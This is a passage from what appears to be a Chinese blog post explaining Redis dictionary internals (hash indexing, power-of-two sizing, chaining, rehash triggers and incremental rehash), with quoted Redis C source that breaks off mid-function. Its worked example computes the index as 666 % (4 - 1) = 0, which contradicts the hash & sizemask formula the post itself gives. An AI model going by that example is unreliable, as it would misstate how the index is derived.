<p>先通过哈希算法求出64位的哈希值，再利用这个哈希值和sizemask掩码得到索引值，源码参考<code>_dictKeyIndex</code>，这里简单给出伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回key的索引值。</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">GetKeyIndex</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = dictGenHashFunction((<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>((<span class="type">char</span> *)key));</span><br><span class="line">	<span class="keyword">return</span> hash &amp; dict-&gt;ht[<span class="number">0</span>].sizemask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举例：一个大小为4的空哈希表，新增一个键值对(k0, v0)， 假设通过哈希算法求出的哈希值为666，按照上面的伪代码，求出索引值为 666 % ( 4 - 1) &#x3D; 0，这说明这个节点需要插入到第0个哈希表数组，如图所示：</p>
<p><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image3.png"></p>
<p><strong>REDIS 3.0中的哈希算法</strong></p>
<p>使用Murmurhash2算法计算键的哈希值，返回uint32_t类型的哈希值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">dictGenHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> len)</span>;</span><br></pre></td></tr></table></figure>



<h4 id="为什么哈希表数组长度设计为2的n次方，有什么好处？"><a href="#为什么哈希表数组长度设计为2的n次方，有什么好处？" class="headerlink" title="为什么哈希表数组长度设计为2的n次方，有什么好处？"></a>为什么哈希表数组长度设计为2的n次方，有什么好处？<span id="jump6"></span></h4><p><strong>好处1</strong>：保证哈希表元素分布均匀，减少哈希冲突。以下举例说明：</p>
<ul>
<li><p>如果哈希表长度size不设置为2的n次方（比如这里设为15），那sizemask &#x3D; 14, 二进制表示：1110；这时假设我要插两个元素，哈希值分别是6 (110), 7 (111)，分别与1110进行与运算后，两者得到的结果是相同的，因此这两个元素存储到同一个链表中，导致效率低下。</p>
</li>
<li><p>如果size设计为2的n次方(比如16），sizemask的二进制为15，二进制表示：1111，此时哈希值6和7分别与1111运行与运算后得到结果110和111，因此这两个元素存储到不同的链表，保证了哈希表元素分布均匀。</p>
</li>
</ul>
<p><strong>好处2</strong>：利用位运算比取模运算更快的特点，提高求哈希索引的效率。</p>
<p>计算哈希索引的本质是取模求余数，但计算机不擅长做模运算，更擅长做位运算。我们注意到，只有在size是2的幂的条件下， 等式<code>hash &amp; (size - 1) == hash % size  </code>才成立。</p>
<p>附：<a href="https://www.codeprj.com/blog/acae4c1.html">位运算和取模运算的运算效率对比</a></p>
<h3 id="如何解决键冲突"><a href="#如何解决键冲突" class="headerlink" title="如何解决键冲突"></a>如何解决键冲突<span id="jump7"></span></h3><p>常见的解决哈希冲突方法：</p>
<ul>
<li>开放寻址法 （线性探查法，平方探查法等）</li>
<li>链地址法</li>
<li>再哈希法</li>
<li>……</li>
</ul>
<p>Redis中使用<strong>链地址法</strong>解决哈希键冲突，即将同一个索引值的多个哈希表节点通过单链表连接起来。</p>
<p>链地址法优点是实现简单，适用于预先不知道哈希表数据大小，插入删除频繁的场景。</p>
<h3 id="rehash操作"><a href="#rehash操作" class="headerlink" title="rehash操作"></a>rehash操作<span id="jump8"></span></h3><h4 id="为什么要rehash？"><a href="#为什么要rehash？" class="headerlink" title="为什么要rehash？"></a>为什么要rehash？<span id="jump9"></span></h4><p>哈希表的扩容和收缩操作通过rehash完成，rehash的目的在于将哈希表的负载因子(键的个数 &#x2F; 哈希表大小)始终维持在合理范围内，以达到最优的时间和空间性能。</p>
<p>如果不设计字典的rehash动作，试考虑以下两个场景中的问题：</p>
<ul>
<li>新增大量的键值对到哈希表，查询某个键的时间复杂度从O(1)退化到O(N)，时间性能差。</li>
<li>考虑一个保存大量键值对的哈希表，删除这个表的所有键后，哈希表数组的空间并没有释放，出现内存占用高甚至内存不足的问题，空间性能差。</li>
</ul>
<p>综上，必须设计字典的rehash动作，当哈希表保存键值对过多或过少时，对哈希表进行动态地扩容和收缩。</p>
<h4 id="rehash的实现步骤"><a href="#rehash的实现步骤" class="headerlink" title="rehash的实现步骤"></a>rehash的实现步骤<span id="jump10"></span></h4><p>1、为字典的ht[1]分配空间，分配的空间大小取决于执行的操作(扩展或收缩）, 以及当前键值对数目（即ht[0].used的值），源码参考<code>_dictExpandIfNeeded</code></p>
<ul>
<li>如执行扩展操作，ht[1]的size设置为ht[0].used * 2, 参考<code>dictExpand</code></li>
<li>如执行收缩操作，ht[1]的size设置为ht[0].used，参考<code>dictResize</code></li>
</ul>
<p>2、将ht[0]的所有键值对rehash到ht[1]，即重新计算ht[0]中所有键值对在ht[1]上的索引值，再将所有键值对加入ht[1]</p>
<p>3、ht[0]中所有键值对完成rehash后，释放ht[0], 将ht[0]指向ht[1]，ht[1]置为空哈希表，为下一次rehash做准备。 </p>
<p><strong>举例：</strong></p>
<p>假设这里对一个大小为4的字典做扩展操作，字典初始状态如下图：<br><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image4.png"></p>
<p>1、为字典的ht[1]分配空间，大小为 4 * 2 &#x3D; 8，分配空间后的字典如下图：</p>
<p><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image5.png"></p>
<p>2、将ht[0]的所有4个键值对rehash到ht[1]，假设重新计算得到的索引值为2, 3, 6, 7，如下图：<br><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image6.png"></p>
<p>3、释放ht[0]，将ht[0]指向ht[1], ht[1]置为空哈希表。和最初的字典对比，我们成功将哈希表的大小从4扩展到了8，如下图：</p>
<p><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image7.png"></p>
<p>至此，我们搞清楚了为啥REDIS要在dict结构体中设计两个哈希表，原因如下：</p>
<ul>
<li><p>rehash过程中简化两个哈希表之间的数据迁移替换操作。</p>
</li>
<li><p>用于实现渐进式的rehash，参考<a href="#jump16">渐进式rehash</a></p>
</li>
</ul>
<h4 id="为什么不直接复制ht-0-的节点到ht-1-，而是要重新计算哈希索引值再rehash？"><a href="#为什么不直接复制ht-0-的节点到ht-1-，而是要重新计算哈希索引值再rehash？" class="headerlink" title="为什么不直接复制ht[0]的节点到ht[1]，而是要重新计算哈希索引值再rehash？"></a>为什么不直接复制ht[0]的节点到ht[1]，而是要重新计算哈希索引值再rehash？<span id="jump11"></span></h4><p>先看下索引值如何计算的: idx &#x3D; <code>hashcode &amp; (dict-&gt;size - 1)</code></p>
<p>注意到，rehash之后哈希数组的大小发生了变化，所以索引值必须重新计算。</p>
<h3 id="rehash的触发条件是什么"><a href="#rehash的触发条件是什么" class="headerlink" title="rehash的触发条件是什么"></a>rehash的触发条件是什么<span id="jump12"></span></h3><p>rehash操作会导致哈希表的扩展或收缩，以下分别讨论哈希表扩展、哈希表收缩两个场景是如何触发的。</p>
<h4 id="负载因子的概念"><a href="#负载因子的概念" class="headerlink" title="负载因子的概念"></a>负载因子的概念<span id="jump13"></span></h4><p>这里先给出哈希表负载因子的定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">load_factor = ht[<span class="number">0</span>].used / ht[<span class="number">0</span>].size;</span><br></pre></td></tr></table></figure>

<p>可以看出，负载因子大于1时，说明一定出现了哈希冲突。</p>
<h4 id="哈希表扩展策略"><a href="#哈希表扩展策略" class="headerlink" title="哈希表扩展策略"></a>哈希表扩展策略<span id="jump14"></span></h4><p>以下条件中满足任意一个，即自动触发哈希表的扩展操作：</p>
<ul>
<li>Redis服务器没有执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>命令，且哈希表负载因子大于等于1</li>
<li>Redis服务器正在执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>命令，且哈希表负载因子大于等于5</li>
</ul>
<p><strong>说明</strong>：执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>操作时，Redis会fork一个子进程。为了充分利用写时复制(Copy On Write)技术，在子进程存在期间，Redis服务器会提高负载因子，避免子进程存在期间进行哈希表扩展操作，引入不必要的内存写入，从而提高性能。</p>
<p>哈希表扩展策略的源码参考<code>_dictExpandifNeeded</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> dict_can_resize = <span class="number">1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> dict_force_resize_ratio = <span class="number">5</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _dictExpandIfNeeded(dict *d) &#123;</span><br><span class="line">    <span class="comment">/* Incremental rehashing already in progress. Return. */</span></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) <span class="keyword">return</span> DICT_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the hash table is empty expand it to the initial size. */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].size == <span class="number">0</span>) <span class="keyword">return</span> dictExpand(d, DICT_HT_INITIAL_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we reached the 1:1 ratio, and we are allowed to resize the hash</span></span><br><span class="line"><span class="comment">     * table (global setting) or we should avoid it but the ratio between</span></span><br><span class="line"><span class="comment">     * elements/buckets is over the &quot;safe&quot; threshold, we resize doubling</span></span><br><span class="line"><span class="comment">     * the number of buckets. */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used &gt;= d-&gt;ht[<span class="number">0</span>].size &amp;&amp;		<span class="comment">// 哈希表扩展的条件</span></span><br><span class="line">        (dict_can_resize ||</span><br><span class="line">         d-&gt;ht[<span class="number">0</span>].used/d-&gt;ht[<span class="number">0</span>].size &gt; dict_force_resize_ratio))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dictExpand(d, d-&gt;ht[<span class="number">0</span>].used*<span class="number">2</span>);	<span class="comment">// 扩展操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dictEnableResize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    dict_can_resize = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dictDisableResize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    dict_can_resize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateDictResizePolicy</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果没有活跃的子进程，dict_can_resize写1，否则写0</span></span><br><span class="line">    <span class="keyword">if</span> (!hasActiveChildProcess())	<span class="comment">// (bgsave, bgwriteaof这些后台持久化操作在fork出的子进程中进行！</span></span><br><span class="line">        dictEnableResize();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dictDisableResize();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hasActiveChildProcess</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> server.rdb_child_pid != <span class="number">-1</span> ||</span><br><span class="line">           server.aof_child_pid != <span class="number">-1</span> ||</span><br><span class="line">           server.module_child_pid != <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="哈希表收缩策略"><a href="#哈希表收缩策略" class="headerlink" title="哈希表收缩策略"></a>哈希表收缩策略<span id="jump15"></span></h4><p>哈希表的负载因子小于0.1时，Redis自动对哈希表做收缩操作。具体场景分析如下：</p>
<ul>
<li><p>删除哈希表中的某个键值对之后，通过<code>htNeedsResize</code>判断是否需对哈希表做收缩，参考<code>hdelCommand</code></p>
</li>
<li><p>Redis服务器的定时事件中，周期性地检查每个数据库键空间字典，调用<code>htNeedsResize</code>判断是否需对哈希表做收缩操作。</p>
</li>
</ul>
<p>哈希表收缩策略参考源码<code>htNeedsResize</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASHTABLE_MIN_FILL 10      <span class="comment">/* Minimal hash table fill 10% */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dictSlots(d) ((d)-&gt;ht[0].size+(d)-&gt;ht[1].size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dictSize(d) ((d)-&gt;ht[0].used+(d)-&gt;ht[1].used)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">htNeedsResize</span><span class="params">(dict *dict)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size, used;</span><br><span class="line">    size = dictSlots(dict);</span><br><span class="line">    used = dictSize(dict);</span><br><span class="line">    <span class="keyword">return</span> (size &gt; DICT_HT_INITIAL_SIZE &amp;&amp;		</span><br><span class="line">            (used*<span class="number">100</span>/size &lt; HASHTABLE_MIN_FILL));	<span class="comment">// 负载因子小于0.1，表示需要收缩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哈希表收缩的实现参考源码<code>dictResize</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DICT_HT_INITIAL_SIZE 4</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictResize</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> minimal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dict_can_resize || dictIsRehashing(d)) <span class="keyword">return</span> DICT_ERR;</span><br><span class="line">    minimal = d-&gt;ht[<span class="number">0</span>].used;			<span class="comment">// 收缩后的哈希表大小为max(ht[0].used, 4)</span></span><br><span class="line">    <span class="keyword">if</span> (minimal &lt; DICT_HT_INITIAL_SIZE)</span><br><span class="line">        minimal = DICT_HT_INITIAL_SIZE;</span><br><span class="line">    <span class="keyword">return</span> dictExpand(d, minimal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定时事件中判断每个数据库键空间字典是否需要收缩，参考源码<code>databasesCron</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">databasesCron</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="comment">// ....</span></span><br><span class="line">	<span class="keyword">if</span> (!hasActiveChildProcess()) &#123;	<span class="comment">// 如果没有执行bgsave, bgwriteaof</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            tryResizeHashTables(resize_db % server.dbnum); <span class="comment">// 尝试对每个数据库键空间字典和过期字典做哈希表收缩</span></span><br><span class="line">            resize_db++;</span><br><span class="line">        &#125;		</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tryResizeHashTables</span><span class="params">(<span class="type">int</span> dbid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (htNeedsResize(server.db[dbid].dict))</span><br><span class="line">        dictResize(server.db[dbid].dict);</span><br><span class="line">    <span class="keyword">if</span> (htNeedsResize(server.db[dbid].expires))</span><br><span class="line">        dictResize(server.db[dbid].expires);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="渐进式rehash"><a href="#渐进式rehash" class="headerlink" title="渐进式rehash"></a>渐进式rehash<span id="jump16"></span></h3><h4 id="为什么需要渐进式rehash"><a href="#为什么需要渐进式rehash" class="headerlink" title="为什么需要渐进式rehash"></a>为什么需要渐进式rehash<span id="jump17"></span></h4><p>考虑一个很大的字典（比如有1亿个key），当扩展或收缩哈希表时，需要将ht[0]中所有键值对rehash到ht[1]，这个计算量是非常庞大的，对Redis服务器性能有一定影响，甚至会导致服务器在一段时间内停止服务。</p>
<p>因此，Redis服务器并不是一次性将ht[0]键值对全部rehash到ht[1]，而是分多次地，渐进式地完成rehash动作。</p>
<h4 id="渐进式rehash的步骤"><a href="#渐进式rehash的步骤" class="headerlink" title="渐进式rehash的步骤"></a>渐进式rehash的步骤<span id="jump18"></span></h4><ul>
<li><p>为ht[1]分配空间，并设置字典的rehashIdx为0，表示rehash从ht[0]的第0号链表开始。</p>
</li>
<li><p>每执行一次字典的增、删、改、查操作时，Redis调用一次<code>_dictRehashStep</code>，将ht[0]哈希表在rehashIdx索引上的所有键值对rehash到ht[1]，rehash完成后将rehashIdx加1</p>
</li>
<li><p>当ht[0]所有键值对都rehash到ht[1]后，将rehashIdx置为-1，表示rehash完成。</p>
</li>
<li><p>另外，Redis服务器的定时任务中，会周期性地调用<code>dictRehashMilliseconds</code>方法，在指定毫秒事件内对字典进行主动的rehash。</p>
</li>
</ul>
<p>可以看出，渐进式rehash采用分治思想，将rehash计算量平摊到对字典的增、删、改、查操作上，避免了一次性rehash的庞大计算量。</p>
<p><strong>rehash源码分析：</strong></p>
<p>1、通过<code>_dictRehashStep</code>执行一次单步的rehash，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _dictRehashStep(dict *d) &#123;</span><br><span class="line">    <span class="keyword">if</span> (d-&gt;iterators == <span class="number">0</span>) dictRehash(d,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Performs N steps of incremental rehashing. Returns 1 if there are still</span></span><br><span class="line"><span class="comment"> * keys to move from the old to the new hash table, otherwise 0 is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that a rehashing step consists in moving a bucket (that may have more</span></span><br><span class="line"><span class="comment"> * than one key as we use chaining) from the old to the new hash table, however</span></span><br><span class="line"><span class="comment"> * since part of the hash table may be composed of empty spaces, it is not</span></span><br><span class="line"><span class="comment"> * guaranteed that this function will rehash even a single bucket, since it</span></span><br><span class="line"><span class="comment"> * will visit at max N*10 empty buckets in total, otherwise the amount of</span></span><br><span class="line"><span class="comment"> * work it does would be unbound and the function may block for a long time. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictRehash</span><span class="params">(dict *d, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> empty_visits = n*<span class="number">10</span>; <span class="comment">/* Max number of empty buckets to visit. */</span></span><br><span class="line">    <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(n-- &amp;&amp; d-&gt;ht[<span class="number">0</span>].used != <span class="number">0</span>) &#123;</span><br><span class="line">        dictEntry *de, *nextde;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Note that rehashidx can&#x27;t overflow as we are sure there are more</span></span><br><span class="line"><span class="comment">         * elements because ht[0].used != 0 */</span></span><br><span class="line">        assert(d-&gt;ht[<span class="number">0</span>].size &gt; (<span class="type">unsigned</span> <span class="type">long</span>)d-&gt;rehashidx);</span><br><span class="line">        <span class="keyword">while</span>(d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            d-&gt;rehashidx++;</span><br><span class="line">            <span class="keyword">if</span> (--empty_visits == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        de = d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx];</span><br><span class="line">        <span class="comment">/* Move all the keys in this bucket from the old to the new hash HT */</span></span><br><span class="line">        <span class="keyword">while</span>(de) &#123;</span><br><span class="line">            <span class="type">uint64_t</span> h;</span><br><span class="line"></span><br><span class="line">            nextde = de-&gt;next;</span><br><span class="line">            <span class="comment">/* Get the index in the new hash table */</span></span><br><span class="line">            h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[<span class="number">1</span>].sizemask;</span><br><span class="line">            de-&gt;next = d-&gt;ht[<span class="number">1</span>].table[h];</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].table[h] = de;</span><br><span class="line">            d-&gt;ht[<span class="number">0</span>].used--;</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].used++;</span><br><span class="line">            de = nextde;</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] = <span class="literal">NULL</span>;</span><br><span class="line">        d-&gt;rehashidx++;											<span class="comment">// rehash完成后，将rehashidx计数加1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if we already rehashed the whole table... */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used == <span class="number">0</span>) &#123;</span><br><span class="line">        zfree(d-&gt;ht[<span class="number">0</span>].table);</span><br><span class="line">        d-&gt;ht[<span class="number">0</span>] = d-&gt;ht[<span class="number">1</span>];</span><br><span class="line">        _dictReset(&amp;d-&gt;ht[<span class="number">1</span>]);</span><br><span class="line">        d-&gt;rehashidx = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* More to rehash... */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Q：为什么要设置单步rehash中最大空桶访问次数限制(<code>empty_visit</code>)？ </p>
<p>A：考虑一个非常大的哈希表，比如有10亿个key, 其中连续1亿个空桶。如果不设置这个限制，会导致rehash中遍历空桶耗时太多，出现服务器阻塞。</p>
<p>2、通过定时任务中，周期性调用<code>dictRehashMilliseconds</code>，对字典执行主动rehash</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">timeInMilliseconds</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"></span><br><span class="line">    gettimeofday(&amp;tv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> (((<span class="type">long</span> <span class="type">long</span>)tv.tv_sec)*<span class="number">1000</span>)+(tv.tv_usec/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Rehash in ms+&quot;delta&quot; milliseconds. The value of &quot;delta&quot; is larger </span></span><br><span class="line"><span class="comment"> * than 0, and is smaller than 1 in most cases. The exact upper bound </span></span><br><span class="line"><span class="comment"> * depends on the running time of dictRehash(d,100).*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictRehashMilliseconds</span><span class="params">(dict *d, <span class="type">int</span> ms)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> start = timeInMilliseconds();</span><br><span class="line">    <span class="type">int</span> rehashes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(dictRehash(d,<span class="number">100</span>)) &#123;</span><br><span class="line">        rehashes += <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span> (timeInMilliseconds()-start &gt; ms) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rehashes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现细节分析：</p>
<ul>
<li><p>通过C语言库函数<code>gettimeofday</code>计算rehash前后的耗时，好处是跨平台，且时间精度可以达到微秒级。</p>
</li>
<li><p>通过循环多次执行一个短任务，每次比较实际用时与规定用时的方式，近似地实现规定时间内执行某个任务的目的。这种实现技巧简化了代码逻辑，值得学习借鉴。</p>
</li>
</ul>
<h4 id="增、删、改、查场景中的rehash实现"><a href="#增、删、改、查场景中的rehash实现" class="headerlink" title="增、删、改、查场景中的rehash实现"></a>增、删、改、查场景中的rehash实现<span id="jump19"></span></h4><p>在rehash过程中，字典会同时使用ht[0], ht[1]两个哈希表，此时字典的增、删、改、查操作也会同时在两个字典中进行。</p>
<ul>
<li><p>查 —— 依次在ht[0], ht[1]中查找。</p>
</li>
<li><p>增 —— 新增的键值对总是只加入到ht[1]，目的是保证ht[0]中键值对只减不增，加速rehash的执行。</p>
</li>
<li><p>删 —— 依次在ht[0], ht[1]中查找节点，并删除。</p>
</li>
</ul>
<p><strong>源码分析：</strong></p>
<p>1、<code>dictAdd</code> 将给定键值对添加到字典，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dictAdd</span><span class="params">(dict *d, <span class="type">void</span> *key, <span class="type">void</span> *val)</span> &#123;</span><br><span class="line">    dictEntry *entry = dictAddRaw(d,key,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!entry) <span class="keyword">return</span> DICT_ERR;</span><br><span class="line">    dictSetVal(d, entry, val);</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictEntry *<span class="title function_">dictAddRaw</span><span class="params">(dict *d, <span class="type">void</span> *key, dictEntry **existing)</span> &#123;</span><br><span class="line">    <span class="type">long</span> index;</span><br><span class="line">    dictEntry *entry;</span><br><span class="line">    dictht *ht;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);	<span class="comment">// 执行一次rehash</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 计算哈希索引值</span></span><br><span class="line">    <span class="keyword">if</span> ((index = _dictKeyIndex(d, key, dictHashKey(d,key), existing)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate the memory and store the new entry.</span></span><br><span class="line"><span class="comment">     * Insert the element in top, with the assumption that in a database</span></span><br><span class="line"><span class="comment">     * system it is more likely that recently added entries are accessed</span></span><br><span class="line"><span class="comment">     * more frequently. </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ht = dictIsRehashing(d) ? &amp;d-&gt;ht[<span class="number">1</span>] : &amp;d-&gt;ht[<span class="number">0</span>]; <span class="comment">// rehash中，新增的键值对加入ht[1]</span></span><br><span class="line">    entry = zmalloc(<span class="keyword">sizeof</span>(*entry));</span><br><span class="line">    entry-&gt;next = ht-&gt;table[index];	 <span class="comment">// 头插法，理由是最先插入的节点被频繁访问的可能性越大</span></span><br><span class="line">    ht-&gt;table[index] = entry;</span><br><span class="line">    ht-&gt;used++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the hash entry fields. */</span></span><br><span class="line">    dictSetKey(d, entry, key);</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><p>每执行一次字典的插入操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</p>
</li>
<li><p>rehash过程中，新增的键值对总是加入到ht[1]，<code>ht = dictIsRehashing(d) ? &amp;d-&gt;ht[1] : &amp;d-&gt;ht[0];</code></p>
</li>
<li><p>使用头插法，理由是最先插入的节点后续被访问的可能性越大，而且实现也非常简单，节省内存。</p>
</li>
</ul>
<p>2、<code>dictDelete</code>从字典中删除给定键的键值对，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dictDelete</span><span class="params">(dict *ht, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dictGenericDelete(ht,key,<span class="number">0</span>) ? DICT_OK : DICT_ERR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> dictEntry *<span class="title function_">dictGenericDelete</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> nofree)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> h, idx;</span><br><span class="line">    dictEntry *he, *prevHe;</span><br><span class="line">    <span class="type">int</span> table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used == <span class="number">0</span> &amp;&amp; d-&gt;ht[<span class="number">1</span>].used == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;	<span class="comment">// 表空不能删除，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);	<span class="comment">// 执行一次rehash</span></span><br><span class="line">    h = dictHashKey(d, key);	<span class="comment">// 计算哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (table = <span class="number">0</span>; table &lt;= <span class="number">1</span>; table++) &#123;	<span class="comment">// 删除操作同时使用ht[0], ht[1]两张表</span></span><br><span class="line">        idx = h &amp; d-&gt;ht[table].sizemask;	<span class="comment">// 计算索引值</span></span><br><span class="line">        he = d-&gt;ht[table].table[idx];</span><br><span class="line">        prevHe = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(he) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key==he-&gt;key || dictCompareKeys(d, key, he-&gt;key)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (prevHe)</span><br><span class="line">                    prevHe-&gt;next = he-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    d-&gt;ht[table].table[idx] = 